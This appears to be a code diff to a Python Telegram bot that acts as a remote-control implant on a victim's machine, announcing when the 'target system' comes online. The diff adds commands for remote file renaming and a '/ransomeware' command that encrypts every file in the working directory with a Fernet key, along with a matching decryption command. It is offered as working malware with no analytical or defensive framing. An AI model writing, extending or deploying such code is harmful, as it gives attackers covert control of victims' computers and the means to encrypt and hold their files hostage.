@@ -4,6 +4,7 @@ import shutil
 from requests.exceptions import ConnectionError
 import subprocess
 import time
+from cryptography.fernet import Fernet
 
 
 
@@ -216,7 +217,98 @@ def handle_docs_photos(message):
     except:
         bot.reply_to(message,"It seems this is not a document.....")
 
+@bot.message_handler(commands=['mv'])
+def movesfile(message):
+    bot.reply_to(message,"Enter your current file name and destination: (for example: main.sh index.sh)Note: Don't abuse file extension otherwise file could be useless.")
+    bot.register_next_step_handler(message,mv)
+def mv(message):
 
+    try:
+        hack0=message.text.split(" ")
+        os.rename(fr"{os.getcwd()}/{hack0[0]}",fr"{os.getcwd()}/{hack0[1]}")
+        bot.send_message(message.chat.id,"Rename Successful.....")
+    except:
+        bot.reply_to(message,"Sorry.Couldn't be renamed......")
+
+@bot.message_handler(commands=['mvs'])
+def movesfiles(message):
+    bot.reply_to(message,"Enter your directory name and the file name: (for example: HackTheSystem YouAreHacked)Note: Don't use file extension otherwise file could be useless.")
+    bot.register_next_step_handler(message,mvs)
+def mvs(message):
+    try:
+        hack=message.text.split(" ")
+        files=os.listdir(fr"{os.getcwd()}/{hack[0]}")
+        dir=fr"{os.getcwd()}/{hack[0]}"
+        s=0
+        for i in files:
+            try:
+                if not os.path.isdir(fr"{dir}/{i}"):
+                    os.rename(fr"{dir}/{i}",fr"{dir}/{hack[1]}{s}{os.path.splitext(i)[1]}")
+
+                if os.path.isdir(fr"{dir}/{i}"):
+                    os.rename(fr"{dir}/{i}",fr"{dir}/{hack[1]}{s}")
+                s=s+1
+            except:
+                continue
+        bot.send_message(message.chat.id,"Rename Successful.....")
+                
+    except:
+        bot.reply_to(message,"Sorry.Couldn't be renamed......")
+
+@bot.message_handler(commands=['ransomeware'])
+def ransomeware(message):
+    files=[]
+    dir=os.getcwd()
+    # print(os.listdir())
+    try:
+        for file in os.listdir(dir):
+            if file!="encrypt.py" and file!=f"decrypt.py" and file!=f"secretkey.key" and  os.path.isfile(file):
+                files.append(file)
+            
+        # print(files)
+        if not os.path.exists("secretkey.key"):
+            key=Fernet.generate_key()
+
+            with open("secretkey.key","wb") as secKey:
+                secKey.write(key)
+        else:
+            with open("secretkey.key","rb") as key:
+                key=key.read()
+        for file in files:
+            with open(file,"rb") as TheFile:
+                content=TheFile.read()
+                encrypted_content=Fernet(key).encrypt(content)
+            with open(file,"wb") as f:
+                f.write(encrypted_content)
+        bot.reply_to(message,"File encryption Successful.......")
+    except:
+        bot.reply_to(message,"Ransomeware is Unsuccessful.")
+@bot.message_handler(commands=['antiransomeware'])
+def antiransomeware(message):
+    try:
+        files=[]
+        dir=os.getcwd()
+        # print(os.listdir())
+        for file in os.listdir(dir):
+            if file!="encrypt.py" and file!=f"decrypt.py" and file!=f"secretkey.key" and  os.path.isfile(file):
+                files.append(file)
+            
+        # print(files)
+        # key=Fernet.generate_key()
+        with open("secretkey.key","rb") as secKey:
+            secKey=secKey.read()
+
+        # with open("secretkey.key","wb") as secKey:
+        #     secKey.write(key)
+        for file in files:
+            with open(file,"rb") as TheFile:
+                content=TheFile.read()
+                decrypted_content=Fernet(secKey).decrypt(content)
+            with open(file,"wb") as f:
+                f.write(decrypted_content)
+        bot.reply_to(message,"File decryption Successful.......")
+    except:
+        bot.reply_to(message,"AntiRansomeware unsuccessful")
 #Add below the chatid's to which you wanna forward alart when victic is online.
 for j in chatids:
     bot.send_message(j,"Target system is on......")
